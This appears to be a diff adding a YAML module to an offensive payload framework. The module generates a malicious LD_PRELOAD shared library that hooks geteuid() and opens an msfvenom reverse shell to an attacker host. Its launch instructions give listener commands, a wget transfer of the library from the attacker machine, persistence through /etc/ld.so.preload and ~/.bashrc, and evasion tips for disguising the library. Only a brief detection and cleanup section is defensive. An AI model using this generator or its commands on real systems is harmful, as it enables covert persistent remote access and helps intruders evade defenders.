@@ -1,0 +1,182 @@
+meta:
+  name: "C Linux LD_PRELOAD Shared Library Hijacking"
+  category: "Persistence"
+  description: |
+    Shared library hijacking via LD_PRELOAD for persistence and privilege escalation on Linux.
+    
+    Features:
+    - Hijacks geteuid() function calls
+    - Executes shellcode when any program calls geteuid()
+    - Forks child process to avoid disrupting parent
+    - Works with LD_PRELOAD environment variable
+    - Stealthy persistence mechanism
+    
+    This technique creates a malicious shared library that hooks common functions.
+    When loaded via LD_PRELOAD, it executes shellcode while maintaining normal program behavior.
+    Effective for persistence if added to /etc/ld.so.preload or user shell profiles.
+    
+    WARNING: For authorized security testing only!
+
+  effectiveness: "medium"
+
+  mitre:
+    tactic: "TA0003 - Persistence"
+    technique: "T1574.006 - Hijack Execution Flow: Dynamic Linker Hijacking"
+
+  artifacts:
+    - "Malicious shared library (.so file)"
+    - "LD_PRELOAD environment variable set"
+    - "/etc/ld.so.preload modification (if persistence)"
+    - "~/.bashrc or ~/.zshrc modification (if user-level persistence)"
+    - "Fork() calls when hooked function invoked"
+    - "mprotect() calls to make memory executable"
+
+parameters:
+  - name: "lhost"
+    type: "ip"
+    description: "Attacker/C2 server IP address for reverse connection"
+    required: true
+
+  - name: "lport"
+    type: "port"
+    description: "Listener port on attacker machine"
+    required: true
+    default: 443
+
+  - name: "output_file"
+    type: "string"
+    description: "Output shared library filename"
+    required: false
+    default: "libhijack.so"
+
+  - name: "output_path"
+    type: "path"
+    description: "Output directory for generated payload"
+    required: false
+    default: "{config.output_dir}"
+
+preprocessing:
+  # Step 1: Generate raw shellcode using msfvenom
+  - type: "command"
+    name: "generate_shellcode"
+    command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} -f raw"
+    output_var: "raw_shellcode"
+
+  # Step 2: Format shellcode as C byte array (no encryption for simplicity)
+  - type: "script"
+    name: "format_payload"
+    script: "format_c.py"
+    args:
+      data: "{{ raw_shellcode }}"
+      var_name: "buf"
+      bytes_per_line: 15
+    output_var: "c_payload"
+
+output:
+  type: "template"
+  template: "persistence/ld_preload.c"
+  compile:
+    enabled: true
+    command: "gcc -Wall -fPIC -z execstack -shared -o {{ output_path }}/{{ output_file }} {{ source_file }} -ldl"
+  launch_instructions: |
+    C Linux LD_PRELOAD Shared Library Hijacking - Launch Instructions
+
+    Step 1: Start Listener
+
+    On attacker machine:
+    nc -lvnp {{ lport }}
+
+    Or using Metasploit:
+    msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
+
+    Step 2: Transfer Library to Target
+
+    Transfer the generated shared library to the target Linux system:
+
+    Using Python HTTP server:
+    python3 -m http.server 8080
+
+    On target:
+    wget http://{{ lhost }}:8080/{{ output_file }} -O /tmp/{{ output_file }}
+    chmod +x /tmp/{{ output_file }}
+
+    Step 3: Test LD_PRELOAD Hijacking
+
+    Test with a simple command:
+    LD_PRELOAD=/tmp/{{ output_file }} id
+
+    This should:
+    1. Print "[Hijacked] Returning from function..."
+    2. Spawn reverse shell to your listener
+    3. Execute the 'id' command normally
+
+    Step 4: Establish Persistence
+
+    Option A - System-wide persistence (requires root):
+    echo "/tmp/{{ output_file }}" > /etc/ld.so.preload
+
+    Option B - User-level persistence:
+    echo 'export LD_PRELOAD=/tmp/{{ output_file }}' >> ~/.bashrc
+    source ~/.bashrc
+
+    Option C - Target specific program:
+    Create wrapper script:
+    #!/bin/bash
+    LD_PRELOAD=/tmp/{{ output_file }} /usr/bin/program
+
+    Step 5: Verify Persistence
+
+    Log out and back in, or run any command that calls geteuid():
+    id
+    whoami
+    ls -la
+
+    Each execution will spawn a new reverse shell.
+
+    Notes:
+
+    - Hijacks geteuid() function (called by many programs)
+    - Forks child process to execute shellcode without disrupting parent
+    - Works on x64 Linux systems
+    - Requires write access to target directory
+    - /etc/ld.so.preload requires root access
+
+    Common Hijack Targets:
+
+    - geteuid() - Get effective user ID (very common)
+    - getuid() - Get user ID
+    - access() - Check file accessibility
+    - open() - Open files
+    - connect() - Network connections
+
+    Evasion Tips:
+
+    - Use less common function names
+    - Hide library in system directories (/lib/x86_64-linux-gnu/)
+    - Name library like legitimate ones (libssl.so.1.1.custom)
+    - Strip debug symbols: strip {{ output_file }}
+
+    Troubleshooting:
+
+    - No shell spawned: Check if target program calls geteuid()
+    - Library not loaded: Verify LD_PRELOAD path is absolute
+    - Permission denied: Ensure library is executable
+    - Multiple shells: Expected behavior if persistence is enabled
+
+    Detection:
+
+    Defenders can detect this via:
+    - Monitor /etc/ld.so.preload for changes
+    - Check LD_PRELOAD in running processes
+    - lsof | grep deleted (for removed but loaded libraries)
+    - Audit .so files in unusual locations
+
+    Cleanup:
+
+    Remove persistence:
+    unset LD_PRELOAD
+    rm /etc/ld.so.preload
+    sed -i '/LD_PRELOAD/d' ~/.bashrc
+
+    Remove library:
+    rm /tmp/{{ output_file }}
